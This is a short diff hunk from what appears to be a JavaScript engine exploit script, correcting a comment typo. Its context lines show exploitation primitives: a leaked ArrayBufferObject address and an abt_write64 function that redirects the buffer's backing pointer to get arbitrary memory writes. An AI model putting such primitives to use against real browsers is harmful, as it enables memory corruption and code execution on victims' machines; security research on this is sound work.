@@ -73,7 +73,7 @@ print("[+] GET ArrayBufferObject address: "+hex(buf_addr));
 
 function abt_write64(addr, content){
 
-    //point to targete address
+    //point to target address
     write64(buf_addr+0x20, addr);
     let buf_f64 = new Float64Array(buf);
     //write content
